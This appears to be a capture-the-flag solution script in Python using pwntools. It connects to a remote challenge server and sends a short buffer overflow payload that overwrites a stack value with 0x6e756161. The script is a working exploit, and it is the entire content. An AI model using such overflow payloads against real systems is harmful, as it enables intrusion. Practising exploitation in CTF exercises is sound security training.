from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244',61460)

payload = b'a'*4 + p32(0x6e756161)

sh.recvuntil(b'bof\n')
sh.sendline(payload)
print(sh.recv())
